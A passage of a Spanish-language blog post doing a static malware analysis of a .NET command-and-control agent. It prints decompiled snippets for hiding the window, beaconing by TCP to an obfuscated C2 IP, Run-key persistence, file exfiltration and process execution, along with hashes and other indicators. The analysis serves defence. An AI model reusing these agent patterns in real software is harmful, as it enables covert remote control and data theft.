<!DOCTYPE html>
<html lang="es">
  <head>
    
      <title>
        004 - Analizando un agente de C2 - Parte 2: el agente - Análisis estático
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="En este artículo, continuación directa del artículo anterior, analizamos un agente de C2 desarrollado en .NET para identificar cómo evade defensas, las capacidades que ofrece, y cómo podemos obtener indicadores de compromiso de este."
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/es/posts/004-analyzing-a-dotnet-c2-agent/" />
<link rel="me" href="https://infosec.exchange/@stapia"/>


<link rel="alternate" hreflang="en" href="https://threatanatomy.io/en/posts/004-analyzing-a-dotnet-c2-agent/" />
<link rel="alternate" hreflang="es" href="https://threatanatomy.io/es/posts/004-analyzing-a-dotnet-c2-agent/" />







<link rel="stylesheet" href="/css/style.css" />

<link rel="stylesheet" href="/style.css" />


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"><meta name="twitter:title" content="004 - Analizando un agente de C2 - Parte 2: el agente - Análisis estático">
<meta name="twitter:description" content="En este artículo, continuación directa del artículo anterior, analizamos un agente de C2 desarrollado en .NET para identificar cómo evade defensas, las capacidades que ofrece, y cómo podemos obtener indicadores de compromiso de este.">



<meta property="og:url" content="/es/posts/004-analyzing-a-dotnet-c2-agent/">
  <meta property="og:site_name" content="Threat Anatomy Blog">
  <meta property="og:title" content="004 - Analizando un agente de C2 - Parte 2: el agente - Análisis estático">
  <meta property="og:description" content="En este artículo, continuación directa del artículo anterior, analizamos un agente de C2 desarrollado en .NET para identificar cómo evade defensas, las capacidades que ofrece, y cómo podemos obtener indicadores de compromiso de este.">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-01-05T12:03:49-05:00">
    <meta property="article:modified_time" content="2024-01-05T12:03:49-05:00">





  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Threat Anatomy Blog</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/es/contact">Contacto</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/es/contact">Contacto</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
        <span>
        <ul class="i18n">
          
            
              
              
                
                <li><a title="English" href="/en/posts/004-analyzing-a-dotnet-c2-agent/"><img id="trans-flag" src=/img/flag-great-britain.png alt="English" /></a></li>
              
            
          
        </ul>
      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <article class="post">
    <h1 class="post-title">004 - Analizando un agente de C2 - Parte 2: el agente - Análisis estático</h1>
    <div class="post-meta">
      
        <time class="post-date">
          2024-01-05
        </time>

        
          
        
      

      


      
        <span class="post-read-time"
          >— 10 min de lectura</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <p><em>This article is also available in <a href="/en/posts/004-analyzing-a-dotnet-c2-agent/">english</a></em></p>
<h2 id="1-introducción">
  1. Introducción
  <a href="#1-introducci%c3%b3n" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>En <a href="/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">la primera parte de este artículo</a> identificamos que, luego de implemenetar ciertas técnicas para dificultar su detección, la macro maliciosa que analizamos extraía y ejecutaba un binario .exe que tenía embebido. En esta parte, analizaremos dicho binario de manera estática para comprender cómo funciona, cómo identificamos que corresponde a un agente de C2, y qué indicadores de compromiso podemos obtener de este.</p>
<p>Debido a la longitud del artículo, en una tercera parte se evaluará de manera dinámica el binario.</p>
<blockquote>
<p><strong>Disclaimer</strong>: Ejecutar malware en un dispositivo personal/corporativo puede poner en riesgo tu información/la información de tu empresa. Nunca ejecutes malware en un dispositivo que no ha sido específicamente configurado para el análisis.</p>
</blockquote>
<h2 id="2-análisis-estático-del-ejecutable">
  2. Análisis estático del ejecutable
  <a href="#2-an%c3%a1lisis-est%c3%a1tico-del-ejecutable" class="h-anchor" aria-hidden="true">#</a>
</h2>
<h3 id="21-identificación-de-hashes-y-framework-de-desarrollo-utilizado">
  2.1 Identificación de hashes y framework de desarrollo utilizado
  <a href="#21-identificaci%c3%b3n-de-hashes-y-framework-de-desarrollo-utilizado" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Iniciamos el análisis obteniendo el hash del ejecutable:</p>
<table>
<thead>
<tr>
<th>Algoritmo</th>
<th>Hash</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5</td>
<td>59211a4e0f27d70c659636746b61945a</td>
</tr>
<tr>
<td>SHA256</td>
<td>2110af4e9c7a4f7a39948cdd696fcd8b 4cdbb7a6a5bf5c5a277b779cc1bf8577</td>
</tr>
</tbody>
</table>
<p>Al abrir el binario en <a href="https://www.winitor.com/download">PEStudio</a>, podemos identificar algunas cosas interesantes:</p>
<p><img alt="alt text" src="/img/004-pestudio1.png" title="PEStudio Analysis"></p>
<ol>
<li>PEStudio identifica el binario como de tipo &ldquo;Microsoft .NET&rdquo;</li>
<li>El binario parece haber sido compilado el 05 de Setiembre del 2023, por lo que es reciente. (Dicho valor puede ser alterado por lo que no es 100% confiable)</li>
<li>Se identifica la ruta del archivo &ldquo;debug&rdquo; del binario, la cual contiene \obj\Debug, directorio estándar creado por Visual Studio.</li>
</ol>
<p>Dichos factores parecen indicarnos que se trata de un programa .NET; adicionalmente, analizando algunas de las otras secciones de información que ofrece PEStudio podemos obtener mayor confirmación sobre esto:</p>
<p><img alt="alt text" src="/img/004-pestudio2.png" title="PEStudio Indicators"></p>
<p><img alt="alt text" src="/img/004-pestudio3.png" title="PEStudio Imports"></p>
<ol>
<li>PEStudio identifica el namespace .NET System.Net.Socket</li>
<li>PEStudio identifica que el programa, durante su ejecución, importa <a href="https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0">clases de .NET</a></li>
</ol>
<p>Con dicha información, podemos decir con casi total certeza de que el binario corresponde a uno desarrollado con el framework .NET. Adicionalmente, verificamos que PEStudio identifica una IP, que puede ser un indicador de compromiso (IOC) de interés.</p>
<h3 id="decompilación-de-binarios-net">
  Decompilación de binarios .NET
  <a href="#decompilaci%c3%b3n-de-binarios-net" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Los programas desarrollados en .NET son usualmente suceptibles a ser decompilados, debido a que no se compilan directamente al lenguaje máquina binario que la computadora entiende (los 0 y 1). En su lugar, se compilan a un lenguaje intermedio conocido como Intermediate Language (IL), el cual es convertido durante la ejecución del programa al lenguaje máquina específico del entorno en el que se está ejecutando.</p>
<p>Si bien dicho framework provee flexibilidad, el lenguaje intermedio contiene información sobre nombres de clases, métodos, metadata, etc., lo que permite que sea decompilado y así, &ldquo;revertido&rdquo; casi a su forma original.</p>
<p>Existen distintas herramientas que permiten decompilar un binario creado en .NET, entre las que se encuentran <a href="https://github.com/icsharpcode/ILSpy"><em>ILSpy</em></a> y <a href="https://github.com/dnSpy/dnSpy"><em>dnSpy</em></a>; para el presente análisis utilizaré <em>dnSpy</em> debido a las capacidades de debugging que ofrece.</p>
<h3 id="22-análisis-inicial-del-binario">
  2.2 Análisis inicial del binario
  <a href="#22-an%c3%a1lisis-inicial-del-binario" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Al abrir el ejecutable en <em>dnSpy</em>, validamos que efectivamente podemos visualizar el código:</p>
<p><img alt="alt text" src="/img/004-dnspy.png" title="dnSpy"></p>
<p>Dado que analizar cada función que llama el ejecutable puede ser muy tedioso (especialmente si contiene código basura destinado a dificultar el análisis), seguiremos el flujo de llamadas que se hacen desde el método Main.</p>
<ol>
<li>Verificamos que cuando el programa se inicia llama al formulario Form1, el cual, al inicializarse, invoca al método <strong>InitializeComponent()</strong>. De la configuración de dicho método podemos destacar tres cosas:
<ol>
<li>Se configura la opacidad del formulario a 0 para hacer de este invisible.</li>
<li>Se configura para que no tenga un ícono en la barra de tareas.</li>
<li>Se llama al método <strong>Form1_Load</strong>.</li>
</ol>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> InitializeComponent()
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.Name = <span style="color:#e6db74">&#34;Form1&#34;</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.Opacity = <span style="color:#ae81ff">0.0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.ShowIcon = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.ShowInTaskbar = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.Text = <span style="color:#e6db74">&#34;Form1&#34;</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.FormClosing += <span style="color:#66d9ef">this</span>.Form1_FormClosing;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.Load += <span style="color:#66d9ef">this</span>.Form1_Load;
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><ol start="2">
<li>El método <strong>Form1_Load</strong> detiene la ejecución (&ldquo;duerme&rdquo;) por unos segundos antes de llamar al método <strong>corediQart()</strong>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Form1_Load(<span style="color:#66d9ef">object</span> sender, EventArgs e)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				Thread.Sleep(<span style="color:#ae81ff">1010</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">base</span>.ShowInTaskbar = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">base</span>.Visible = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">base</span>.FormBorderStyle = FormBorderStyle.SizableToolWindow;
</span></span><span style="display:flex;"><span>				Thread.Sleep(<span style="color:#ae81ff">2050</span>);
</span></span><span style="display:flex;"><span>				Thread.Sleep(<span style="color:#ae81ff">1280</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">this</span>.mainvp.corediQart();
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">catch</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><p>Esta técnica (<a href="https://attack.mitre.org/techniques/T1497/003/">T1497.003</a>) usualmente es utilizada por atacantes para evadir herramientas de análisis dinámico, muchas de las cuales solo están activas por un corto tiempo y puede que crean que un binario no tiene comportamiento malicioso solo porque aún no es ejecutado. En este caso, desde mi punto de vista, los tiempos son muy cortos para estar utilizando dicha técnica, por lo que probablemente están para dar tiempo a otros componentes del programa de terminar de cargar.</p>
<ol start="3">
<li>El método <strong>corediQart()</strong> realiza las siguientes acciones:
<ol>
<li>Asigna el primer puerto definido en la variable <em>ports</em> a la variable <em>port</em>.</li>
<li>Obtiene el nombre de la computadora donde se está ejecutando, así como el usuario que está ejecutando el programa y lo asigna a la variable <em>userAiunt</em>.</li>
<li>Crea un objeto de tipo <em>TimerCallback</em> que llama al método <strong>procvQloop</strong>.</li>
<li>Configura el objeto de tipo <em>TimerCallback</em> para que se ejecute cada 58.51 segundos, luego de esperar inicialmente 49.12 segundos.</li>
</ol>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> corediQart()
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			DIRERRIF.port = DIRERRIF.ports[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.userAiunt = <span style="color:#66d9ef">new</span> MRDFINF();
</span></span><span style="display:flex;"><span>			...
</span></span><span style="display:flex;"><span>			TimerCallback callback = <span style="color:#66d9ef">new</span> TimerCallback(<span style="color:#66d9ef">this</span>.procvQloop);
</span></span><span style="display:flex;"><span>			Timer timer = <span style="color:#66d9ef">new</span> Timer(callback, <span style="color:#66d9ef">this</span>.objeAdate, <span style="color:#ae81ff">49120</span>, <span style="color:#ae81ff">58510</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.objeAdate.timer = timer;
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[] ports = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[]
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">9149</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">15198</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">17818</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">27781</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">29224</span>
</span></span><span style="display:flex;"><span>		};
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> MRDFINF()
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			...
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.comtname = SystemInformation.ComputerName;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.acc_datQtime = Environment.UserName;
</span></span><span style="display:flex;"><span>			...
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><ol start="4">
<li>Analizando lo que hace el método <strong>procvQloop()</strong>, inicia una conexión TCP con la IP almacenada en la variable <em>min_codns</em>; en dicha variable, la IP se encuentra almacenada como un conjunto de bytes, probablemente para dificultar su detección:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>DIRERRIF.mainwtp = Encoding.UTF8.GetString(DIRERRIF.min_codns, <span style="color:#ae81ff">0</span>, DIRERRIF.min_codns.Length).ToString();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.maiedet = <span style="color:#66d9ef">new</span> TcpClient();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.maiedet.Connect(DIRERRIF.mainwtp, DIRERRIF.port);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] min_codns = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[]
</span></span><span style="display:flex;"><span>{<span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">55</span>};
</span></span></code></pre></div><p>La conexión TCP se realiza con la IP almacenada en la variable <em>min_codns</em> en el puerto asignado a la variable <em>port</em>.</p>
<ol start="5">
<li>Una vez realizada la conexión, si es exitosa, se llama al método <strong>procD_core()</strong>, el cual realiza múltiples operaciones:
<ol>
<li>Obtiene una respuesta de la conexión TCP establecida previamente.</li>
<li>Separa la respuesta obtenida utilizando el separador &lsquo;=&rsquo;.</li>
<li>En base al primer valor de la respuesta (lo que estaba antes del &lsquo;=&rsquo;) llama a distintos métodos.</li>
</ol>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> procD_core()
</span></span><span style="display:flex;"><span>        ...
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span>[] procss_type = <span style="color:#66d9ef">this</span>.get_procsQtype();
</span></span><span style="display:flex;"><span>		...
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span> text = procss_type[<span style="color:#ae81ff">0</span>].ToLower();
</span></span><span style="display:flex;"><span>		...
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;thyTumb&#34;</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.imagiQtails(procss_type[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;scyTrsz&#34;</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.dsAscrnsize(procss_type[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		...
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span>[] get_procsQtype()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span>[] result;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">byte</span>[] array = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">5</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">this</span>.byteAdesr = <span style="color:#66d9ef">this</span>.newWam.Read(array, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> num = BitConverter.ToInt32(array, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">byte</span>[] array2 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[num];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> num2 = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = num; i &gt; <span style="color:#ae81ff">0</span>; i -= <span style="color:#66d9ef">this</span>.byteAdesr)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> count = (i &gt; <span style="color:#66d9ef">this</span>.bufeAize) ? <span style="color:#66d9ef">this</span>.bufeAize : i;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.byteAdesr = <span style="color:#66d9ef">this</span>.newWam.Read(array2, num2, count);
</span></span><span style="display:flex;"><span>			num2 += <span style="color:#66d9ef">this</span>.byteAdesr;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span> text = Encoding.UTF8.GetString(array2, <span style="color:#ae81ff">0</span>, num).ToString();
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (text.Trim() == <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			result = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			result = text.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[]
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#e6db74">&#39;=&#39;</span>
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Sin analizar el resto de las funciones, el comportamiento del programa ya nos hace suponer que puede ser un agente de C2:</p>
<ol>
<li>Cada cierto tiempo (aproximadamente cada minuto), se comunica con un servidor basado en una IP y un puerto no común.</li>
<li>Recibe respuesta del servidor, la cual se compone de dos secciones.</li>
<li>En base a la primera sección (comandos), llama a métodos pasándoles la segunda sección (payload/parámetros del comando).</li>
</ol>
<p>En base a dicho análisis podemos asumir que el servidor envía comandos al agente, el cual los ejecuta. Posterior análisis nos permitirá confirmar si realmente es un agente de Comando y Control, así como las capacidades que tiene este agente.</p>
<h3 id="23-análisis-de-los-métodos-del-agente-de-c2">
  2.3 Análisis de los métodos del agente de C2
  <a href="#23-an%c3%a1lisis-de-los-m%c3%a9todos-del-agente-de-c2" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Debido a que analizar cada función sería muy tedioso, analizaremos algunas funciones que me parecieron interesantes:</p>
<h4 id="231-listar-procesos">
  2.3.1 Listar procesos
  <a href="#231-listar-procesos" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>Al igual que en la macro que contenía el binario, se visualiza el uso de subguiones para separar comandos/variables:</p>
<p><img alt="alt text" src="/img/004-lp1.png" title="Obfuscation"></p>
<p>Al recibir el comando &ldquo;geyTtavs&rdquo;, se obtienen los procesos que se están ejecutando en el sistema y se envía el ID y nombre de estos mediante la función <strong>loadQData</strong>:</p>
<p><img alt="alt text" src="/img/004-lp2.png" title="List Processes"></p>
<p>La función <strong>loadQData</strong> envía el tipo de respuesta a esperar, el tamaño de esta y la respuesta al servidor.</p>
<p>Con solo analizar la función de listar procesos, podemos confirmar que es un agente de Comando y Control: el programa se contacta a un servidor, recibe una instrucción (listar procesos en este caso) y envía la respuesta al servidor.</p>
<h4 id="232-establecer-persistencia">
  2.3.2 Establecer persistencia
  <a href="#232-establecer-persistencia" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>La llave de registro <em>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</em> es usualmente abusada por atacantes para establecer persistencia; dicha técnica está <a href="https://attack.mitre.org/techniques/T1547/001/">catalogada en MITRE ATT&amp;CK con ID T1547.001</a> y <a href="https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys">permite a un atacante ejecutar un programa cuando el usuario inicia sesión</a>, bajo el contexto (permisos) de ese usuario.</p>
<p>Verificamos que el agente ofrece la capacidad de establecer persistencia, al recibir el comando &ldquo;puyTtsrt&rdquo; crea la llave de registro con nombre &ldquo;haijwivetsgVr&rdquo;:</p>
<p><img alt="alt text" src="/img/004-pers1.png" title="Establish persistence 1"></p>
<p><img alt="alt text" src="/img/004-pers2.png" title="Establish persistence 2"></p>
<p><img alt="alt text" src="/img/004-pers3.png" title="Establish persistence 3"></p>
<p>Al igual que antes, vemos que el nombre de la ruta en el registro ha sido dividido utilizando subguiones para dificultar su identificación.</p>
<h4 id="233-listar-archivos">
  2.3.3 Listar archivos
  <a href="#233-listar-archivos" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>Al recibir el comando &ldquo;flyTes&rdquo; junto con una ruta, el comando lista los archivos de la ruta utilizando el método <strong>Directory.GetFiles</strong>, los concatena utilizando el caracter &lsquo;&gt;&rsquo; como separador y los envía al servidor:</p>
<p><img alt="alt text" src="/img/004-listfiles.png" title="Listing files"></p>
<p><img alt="alt text" src="/img/004-listfiles2.png" title="Read directory"></p>
<h4 id="234-sacar-capturas-de-pantalla">
  2.3.4 Sacar capturas de pantalla
  <a href="#234-sacar-capturas-de-pantalla" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>Los comandos &ldquo;cdyTcrgn&rdquo;, &ldquo;csyTcrgn&rdquo; y &ldquo;csyTdcrgn&rdquo; pueden ser utilizados para sacar capturas de pantalla y enviarlas al servidor:</p>
<p><img alt="alt text" src="/img/004-sc1.png" title="Screen capture 1"></p>
<p><img alt="alt text" src="/img/004-sc2.png" title="Screen capture 2"></p>
<p><img alt="alt text" src="/img/004-sc3.png" title="Screen capture 3"></p>
<h4 id="235-exfiltración-de-archivos">
  2.3.5 Exfiltración de archivos
  <a href="#235-exfiltraci%c3%b3n-de-archivos" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>El comando &ldquo;afyTile&rdquo; puede ser utilizado para exfiltrar un archivo de la máquina víctima al servidor; para ello, recibe como parámetro la ruta del archivo a exfiltrar:</p>
<p><img alt="alt text" src="/img/004-exfilb.png" title="File exfiltration"></p>
<p><img alt="alt text" src="/img/004-exfila.png" title="File exfiltration 2"></p>
<p>La información devuelta al servidor incluye la ruta del archivo, el nombre del archivo y el contenido de este.</p>
<h4 id="236-ejecutar-binarios">
  2.3.6 Ejecutar binarios
  <a href="#236-ejecutar-binarios" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>Para ejecutar un programa que exista en el sistema (sea nativo o descargado con otro comando), se utiliza  el comando &ldquo;ruyTnf&rdquo;, el cual inicia un nuevo proceso recibiendo como parámetro el nombre del programa a ejecutar.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;ruyTnf&#34;</span>) {
</span></span><span style="display:flex;"><span>  ..
</span></span><span style="display:flex;"><span>    Process.Start(procss_type[<span style="color:#ae81ff">1</span>].Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[] { <span style="color:#e6db74">&#39;&gt;&#39;</span> })[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="237-eliminar-un-archivo">
  2.3.7 Eliminar un archivo
  <a href="#237-eliminar-un-archivo" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>El comando &ldquo;deyTlt&rdquo; recibe como parámetro la ruta donde está almacenado un archivo, para posteriormente utilizar el método <strong>File.Delete</strong> para eliminarlo:</p>
